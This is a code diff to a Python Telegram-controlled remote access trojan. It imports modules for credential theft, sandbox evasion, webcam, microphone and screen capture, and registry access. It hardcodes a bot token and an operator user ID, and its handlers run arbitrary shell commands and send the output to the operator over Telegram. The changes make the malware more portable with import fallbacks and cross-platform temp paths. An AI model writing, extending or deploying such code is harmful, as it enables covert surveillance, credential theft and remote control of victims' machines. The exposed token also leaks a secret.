@@ -1,37 +1,60 @@
-import telebot
+import sys
 import os
+
+# Add root directory to sys.path to find libraries
+root_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
+if root_dir not in sys.path:
+    sys.path.insert(0, root_dir)
+
+import telebot
 import subprocess as sp
 import requests
 import random
-from cv2 import VideoCapture
-from cv2 import imwrite
-from scipy.io.wavfile import write
-from sounddevice import rec, wait
+try:
+    from cv2 import VideoCapture
+    from cv2 import imwrite
+except ImportError:
+    pass
+
+try:
+    from scipy.io.wavfile import write
+    from sounddevice import rec, wait
+except ImportError:
+    pass
+
 import platform
 import re
 from urllib.request import Request, urlopen
-import pyautogui
+
+try:
+    import pyautogui
+except Exception:
+    pyautogui = None
+
 from datetime import datetime
 import shutil
-import sys
 from multiprocessing import Process
 import threading
 import json
 import ctypes
-from ctypes.wintypes import HKEY
 import time
+
 try:
-    from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
+    from ctypes.wintypes import HKEY
+    from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry, HKEY_CURRENT_USER, REG_SZ
     import win32api
     import win32process
-    import psutil
     import win32pdh
     from winreg import *
     from ctypes import *
 except ImportError:
-    # Windows-specific modules not available; define placeholders if needed
-    pass
-from libraries import credentials,sandboxevasion,disctopia
+    # Windows-specific modules not available
+    HKEY = None
+    HKEY_LOCAL_MACHINE = None
+    ConnectRegistry = None
+
+import psutil
+from libraries import credentials, sandboxevasion, disctopia
 
 BOT_TOKEN = "8400715925:AAFrMytYs0vKxww5ud--g86BT0WCFio5vqU"
 USER_ID = "7904253040" 
@@ -50,7 +73,8 @@ def cmd(message):
         command = ' '.join(arguments[1:])
         reply = disctopia.cmd(command)
         if len(reply) > 4000:
-            path = os.environ["temp"] +"\\response.txt"     
+            temp_dir = os.environ.get("TEMP") or os.environ.get("TMP") or "/tmp"
+            path = os.path.join(temp_dir, "response.txt")
             with open(path, 'w') as file:
                 file.write(reply)
             bot.send_document(message.chat.id, open(path, 'rb'))
@@ -87,7 +111,8 @@ def webshot(message):
 def process(message):
     result = disctopia.process()
     if len(result) > 4000:
-        path = os.environ["temp"] +"\\response.txt"     
+        temp_dir = os.environ.get("TEMP") or os.environ.get("TMP") or "/tmp"
+        path = os.path.join(temp_dir, "response.txt")
         with open(path, 'w') as file:
             file.write(result)
         bot.send_document(message.chat.id, open(path, 'rb'))
